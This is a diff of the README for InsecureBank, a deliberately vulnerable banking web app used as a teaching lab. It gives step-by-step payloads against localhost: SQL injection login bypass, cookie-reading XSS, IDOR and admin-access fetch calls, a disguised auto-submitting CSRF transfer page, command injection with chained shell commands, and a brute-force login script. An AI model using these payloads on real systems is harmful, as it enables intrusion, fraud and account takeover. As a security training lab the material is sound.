@@ -1,163 +1,183 @@
-# InsecureBank - Vulnerable Banking Application
+# InsecureBank - Learn Cybersecurity Through Practice
 
-A deliberately vulnerable banking application for educational purposes demonstrating common web security vulnerabilities.
+A **deliberately broken** banking website designed to teach cybersecurity by letting you practice real attacks safely.
 
-## ⚠️ Disclaimer
+## ⚠️ Important Warning
 
-**This application contains intentional security vulnerabilities. Use only for educational purposes in controlled environments.**
-
-
-## 👥 User Credentials
-
-| Username | Password | Role |
-|----------|----------|------|
-| `admin` | `admin123` | Administrator |
-| `john_doe` | `password` | User |
-| `jane_smith` | `123456` | User |
-| `bob_wilson` | `Bobbbb` | User |
-| `ycp27` | `ycp123` | User |
+**This website is INTENTIONALLY vulnerable!** 
+- Only use it for learning cybersecurity
+- Never use these techniques on real websites (that's illegal!)
+- Run this only on your own computer
 
 ---
 
-## 🎯 Attack Demonstrations
+## 🚀 Quick Setup
 
-### 1. SQL Injection Attack
+### Step 1: Install and Run
+1. **Download this project**
+2. **Install dependencies:**
+   ```bash
+   # Backend (API server)
+   cd backend
+   npm install
+   npm start
+   
+   # Frontend (Website)
+   cd vul-bank-app
+   npm install
+   npm run dev
+   ```
+3. **Open your browser:** `http://localhost:5173`
 
-**Authentication Bypass**
-
-SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code through input fields.
-
-**Test Case:**
-- Navigate to login page
-- Username: `admin'--  OR '1'='1`
-- Password: `anything`
-- Result: Bypasses authentication without valid credentials
-
-**Why it works:** The injected SQL creates a condition that's always true, breaking the intended query logic.
+### Step 2: Database Setup
+- Follow instructions in `demo-files/DATABASE_SETUP_GUIDE.md`
+- Choose either CleverCloud (online) or XAMPP (local)
 
 ---
 
-### 2. Cross-Site Scripting (XSS) Attack
+## 👥 Test Users (Login Credentials)
 
-**Stored XSS in Profile**
+| Username | Password | What they are |
+|----------|----------|---------------|
+| `admin` | `admin123` | Bank Administrator |
+| `john_doe` | `password` | Regular Customer |
+| `jane_smith` | `123456` | Regular Customer |
+| `bob_wilson` | `Bobbbb` | Regular Customer |
+| `ycp27` | `ycp123` | Regular Customer |
 
-XSS allows attackers to inject malicious scripts that execute in other users' browsers, potentially stealing session data.
+---
 
-**Test Case:**
-- Login as any user
-- Navigate to Profile Management
-- Full Name field: `<img src=x onerror=alert('XSS')>`
-- Update profile
-- When admin views this profile, the script executes
+## 🎯 Cybersecurity Attacks You Can Practice
 
-**Payloads to try:**
+### 1. **SQL Injection** - Bypass Login Without Password
+
+**What it is:** Tricking the database by inserting special code into login forms.
+
+**How to do it:**
+1. Go to the login page
+2. **Username:** `admin'--`
+3. **Password:** `anything` (literally type "anything")
+4. Click Login
+5. **Result:** You're logged in as admin without the real password!
+
+**Why it works:** The `--` makes the database ignore the password check.
+
+---
+
+### 2. **Cross-Site Scripting (XSS)** - Inject Malicious Code
+
+**What it is:** Putting harmful code into websites that runs when others visit.
+
+**How to do it:**
+1. Login as any user
+2. Go to your Profile page
+3. In the **Full Name** field, paste: `<img src=x onerror=alert('HACKED!')>`
+4. Save your profile
+5. **Result:** Every time someone views your profile, they see a "HACKED!" popup
+
+**More examples to try:**
 ```html
-<img src=x onerror=alert(document.cookie)>
-<script>alert('XSS')</script>
-<svg/onload=alert('XSS')>
+<script>alert('Your session: ' + document.cookie)</script>
+<img src=x onerror=alert('XSS Attack Successful')>
 ```
 
 ---
 
-### 3. Insecure Direct Object Reference (IDOR)
+### 3. **IDOR (Insecure Direct Object Reference)** - Access Other People's Data
 
-**Unauthorized Data Access**
+**What it is:** Viewing or changing other users' information by changing numbers in URLs.
 
-IDOR vulnerabilities allow attackers to access resources belonging to other users by manipulating object references.
-
-**Test Case - View Other Users' Transactions:**
-- Login as `john_doe` (ID: 2)
-- Open browser console (F12)
-- Execute:
+**How to do it:**
+1. Login as `john_doe` (user ID 2)
+2. Open your browser's **Developer Tools** (Press F12)
+3. Go to **Console** tab
+4. Paste this code and press Enter:
 ```javascript
 fetch('http://localhost:5000/api/transactions/1', {
   credentials: 'include'
 }).then(r => r.json()).then(console.log)
 ```
-- Result: Access admin's transactions without authorization
+5. **Result:** You can see admin's transactions even though you're not admin!
 
-**Test Case - Modify Other Users' Profiles:**
+**View any user's profile:**
 ```javascript
-fetch('http://localhost:5000/api/profile/1', {
-  method: 'PUT',
-  headers: { 'Content-Type': 'application/json' },
-  credentials: 'include',
-  body: JSON.stringify({
-    fullName: 'Modified Name',
-    email: 'modified@email.com'
-  })
+fetch('http://localhost:5000/api/user/1', {
+  credentials: 'include'
 }).then(r => r.json()).then(console.log)
 ```
 
 ---
 
-### 4. Cross-Site Request Forgery (CSRF)
+### 4. **CSRF (Cross-Site Request Forgery)** - Force Users to Do Things
 
-**Unauthorized Actions**
+**What it is:** Tricking logged-in users into performing actions without knowing.
 
-CSRF tricks authenticated users into performing unintended actions by exploiting their active session.
-
-**Test Case - Malicious Money Transfer:**
-
-Create `csrf-attack.html`:
+**How to do it:**
+1. Create a new file called `attack.html` on your computer
+2. Put this code in it:
 ```html
 <!DOCTYPE html>
 <html>
+<head><title>You Won $1000!</title></head>
 <body>
-    <h1>You Won a Prize!</h1>
-    <form id="csrf" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">
-        <input name="recipient" value="ycp27">
+    <h1>Congratulations! Click here to claim your prize!</h1>
+    <form id="sneaky" action="http://localhost:5000/api/transfer" method="POST" style="display:none;">
+        <input name="fromUserId" value="2">
+        <input name="toUsername" value="ycp27">
         <input name="amount" value="1000">
+        <input name="description" value="CSRF Attack - You've been hacked!">
     </form>
     <script>
-        setTimeout(() => document.getElementById('csrf').submit(), 1000);
+        // Automatically submit the form after 2 seconds
+        setTimeout(() => {
+            document.getElementById('sneaky').submit();
+            alert('Money transferred! You have been victims of CSRF attack!');
+        }, 2000);
     </script>
 </body>
 </html>
 ```
-- Victim opens this page while logged into the bank
-- Result: Money transferred without victim's knowledge
+3. Have someone who's logged into the bank open this file
+4. **Result:** Money gets transferred from their account without them knowing!
 
 ---
 
-### 5. Command Injection Attack
+### 5. **Command Injection** - Control the Server
 
-**Remote Code Execution**
+**What it is:** Making the server run commands by inserting special code.
 
-Command injection allows attackers to execute arbitrary system commands on the server.
+**How to do it:**
+1. Login to the bank
+2. Go to **System Tools** (if available)
+3. In the ping field, type: `8.8.8.8 && whoami`
+4. Submit
+5. **Result:** Shows you information about the server!
 
-**Test Case - System Tools Exploitation:**
-- Navigate to System Tools
-- Host/IP field: `8.8.8.8 && whoami`
-- Result: Executes system command and reveals server user
-
-**Additional payloads:**
+**More commands to try:**
 ```bash
-8.8.8.8 && dir          # List directory contents
-8.8.8.8 && ipconfig     # Network configuration
-8.8.8.8 && systeminfo   # System information
+8.8.8.8 && dir                    # Show folder contents
+8.8.8.8 && echo "I hacked this!"  # Display custom message
+8.8.8.8 && ipconfig               # Show network info
 ```
 
 ---
 
-### 6. Broken Access Control
+### 6. **Privilege Escalation** - Access Admin Features
 
-**Privilege Escalation**
+**What it is:** Regular users accessing admin-only features.
 
-Missing authorization checks allow regular users to access admin-only functionality.
-
-**Test Case - Access Admin Data:**
-- Login as regular user
-- Open browser console
-- Execute:
+**How to do it:**
+1. Login as a regular user (not admin)
+2. Open Developer Tools (F12) → Console
+3. Try to access admin data:
 ```javascript
 fetch('http://localhost:5000/api/admin/users', {
   credentials: 'include'
 }).then(r => r.json()).then(console.log)
 ```
-- Result: Regular user retrieves admin-only data
+4. **Result:** You can see all users' data even though you're not admin!
 
-**Test Case - Delete Users:**
+**Delete other users:**
 ```javascript
 fetch('http://localhost:5000/api/admin/user/3', {
   method: 'DELETE',
@@ -167,85 +187,113 @@ fetch('http://localhost:5000/api/admin/user/3', {
 
 ---
 
-### 7. Session Hijacking
+### 7. **Session Hijacking** - Steal Login Sessions
 
-**Cookie Theft via XSS**
+**What it is:** Stealing someone's login session to impersonate them.
 
-Combining XSS with cookie theft allows attackers to impersonate victims.
+**How to do it (Method 1 - Cookie Theft):**
+1. Use XSS attack to steal cookies
+2. In profile, enter: `<img src=x onerror="alert('Your session cookie: ' + document.cookie)">`
+3. When someone views your profile, their session cookie is revealed
 
-**Test Case:**
-- Inject in profile: `<img src=x onerror="alert(document.cookie)">`
-- When admin views profile, session cookie is exposed
-- Attacker can use this cookie to impersonate the admin
-
-**Manual Cookie Manipulation:**
-- F12 → Application → Cookies
-- Change `userId` value to `1` (admin)
-- Refresh page
-- Result: Potential admin access
+**How to do it (Method 2 - Manual Cookie Change):**
+1. Press F12 → Application tab → Cookies
+2. Find the cookies for localhost:5173
+3. Change any `userId` value to `1` (admin's ID)
+4. Refresh the page
+5. **Result:** You might gain admin access!
 
 ---
 
-### 8. Brute Force Attack
+### 8. **Brute Force Attack** - Guess Passwords
 
-**Password Guessing**
+**What it is:** Trying many passwords until you find the right one.
 
-Absence of rate limiting allows unlimited login attempts.
-
-**Test Case:**
+**How to do it:**
+1. Open Developer Tools (F12) → Console
+2. Paste this code:
 ```javascript
-const passwords = ['admin', 'admin123', 'password', '123456'];
+const passwords = ['admin', 'admin123', 'password', '123456', 'qwerty', 'letmein'];
 
-async function bruteForce() {
-  for (let pwd of passwords) {
-    const response = await fetch('http://localhost:5000/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: 'admin', password: pwd })
-    });
-    const data = await response.json();
-    if (data.message === 'Login successful') {
-      console.log('Found password:', pwd);
-      break;
+async function hackPassword() {
+    console.log('Starting password attack...');
+    
+    for (let pwd of passwords) {
+        console.log(`Trying password: ${pwd}`);
+        
+        const response = await fetch('http://localhost:5000/api/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                username: 'admin', 
+                password: pwd 
+            })
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            console.log(`SUCCESS! Password found: ${pwd}`);
+            alert(`Password cracked! Admin password is: ${pwd}`);
+            break;
+        }
+        
+        // Wait 1 second between attempts
+        await new Promise(resolve => setTimeout(resolve, 1000));
     }
-  }
 }
-bruteForce();
+
+hackPassword();
 ```
+3. **Result:** The script will find the admin password automatically!
 
 ---
 
-### 9. Information Disclosure
+### 9. **Information Disclosure** - Find Hidden Data
 
-**Sensitive Data Exposure**
+**What it is:** Discovering sensitive information that shouldn't be visible.
 
-API responses contain sensitive information that should never be exposed to clients.
+**How to do it:**
+1. Open any page on the bank website
+2. Press F12 → Network tab
+3. Click around the website (login, view profile, etc.)
+4. **Look at the API responses**
+5. **Result:** You can see passwords, internal data, and sensitive information!
 
-**Test Case:**
-- Login and open Network tab (F12)
-- Observe API responses
-- Result: Plain text passwords and sensitive user data visible
-
+**Direct API exploration:**
 ```javascript
-fetch('http://localhost:5000/api/login', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ username: 'admin', password: 'admin123' })
+fetch('http://localhost:5000/api/search?query=admin', {
+  credentials: 'include'
 }).then(r => r.json()).then(console.log)
 ```
-Response includes password in plain text!
 
 ---
 
-## � Learning Resources
+## 🛡️ What You'll Learn
 
-## 📚 Learning Resources
-
-- **OWASP Top 10** - [https://owasp.org/Top10/](https://owasp.org/Top10/)
-- **PortSwigger Web Security Academy** - [https://portswigger.net/web-security](https://portswigger.net/web-security)
+By practicing these attacks, you'll understand:
+- How hackers break into websites
+- Why input validation is important
+- How to protect against common attacks
+- Real cybersecurity vulnerabilities
+- How to think like a security tester
 
 ---
 
-**⚠️ Use only for educational purposes in controlled environments. Never test on systems without authorization.**
+## 📚 Want to Learn More?
 
-**Repository**: [https://github.com/Yrcd27/Insecure-Bank](https://github.com/Yrcd27/Insecure-Bank)
+- **OWASP Top 10**: Common web vulnerabilities → [owasp.org/Top10](https://owasp.org/Top10/)
+- **PortSwigger Academy**: Free cybersecurity courses → [portswigger.net/web-security](https://portswigger.net/web-security)
+
+---
+
+## 🎓 Educational Use Only
+
+**Remember:**
+- ✅ Use this to learn cybersecurity
+- ✅ Practice on your own computer
+- ✅ Share knowledge responsibly
+- ❌ Never attack real websites
+- ❌ Don't use this knowledge illegally
+
+**Happy Learning! 🚀**
